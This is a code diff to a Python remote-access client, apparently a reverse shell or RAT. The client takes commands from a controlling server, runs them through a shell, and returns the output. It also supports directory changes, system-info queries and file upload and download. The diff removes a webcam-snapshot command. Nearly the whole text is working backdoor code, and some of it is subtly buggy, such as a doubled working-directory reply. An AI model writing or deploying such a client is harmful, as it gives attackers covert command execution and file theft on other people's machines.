@@ -23,14 +23,13 @@ def send_file(filename):
         s.send("Path doesn't exist!".encode())
         return
     s.send(str(filesize).encode())
+    if filesize == 0:
+        return
     if s.recv(BUFFER_SIZE).decode() == "ok":
-        # start sending the file
         with open(filename, "rb") as f:
             while True:
-                # read the bytes from the file
                 bytes_read = f.read(BUFFER_SIZE)
                 if not bytes_read:
-                    # file transmitting is done
                     break
                 s.sendall(bytes_read)
 
@@ -55,16 +54,20 @@ def recv_file(path):
 def run():
     while True:
         # receive the command from the server
-        cmd = s.recv(BUFFER_SIZE).decode()
+        cmd = s.recv(BUFFER_SIZE).decode('utf-8', 'ignore')
+        print(cmd)
         if cmd.lower() == "exit":
             # if the command is exit, just break out of the loop
             break
         elif cmd[:2] == 'cd':
             if cmd[3] == '~':
-                os.chdir(os.environ['HOME'] + (cmd[4:] if len(cmd) > 3 else None))
+                os.chdir(os.environ['HOME'] + (cmd[4:] if len(cmd)>3 else None))
             else:
-                os.chdir(cmd[3:])
-            s.send(os.getcwd().encode())
+                try:
+                    os.chdir(cmd[3:])
+                except FileNotFoundError:
+                    pass
+            s.send(os.getcwd().encode() + os.getcwd().encode() + "> ".encode())
         elif cmd[:7] == "sysinfo":
             s.send(platform.platform().encode() + "\n".encode())
         # File download
@@ -75,12 +78,10 @@ def run():
         elif cmd[:6] == "upload":
             filename = cmd[7:]
             recv_file(filename)
-        # Webcam Snapshot
-        elif cmd[:11] == "webcam_snap":
-            webcam_snap()
         else:
             p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            s.send(p.stdout + "\n".encode() + os.getcwd().encode())
+            # send the results back to the server
+            s.send(p.stdout + "\n".encode() + os.getcwd().encode() + "> ".encode())
     s.close()
 
 
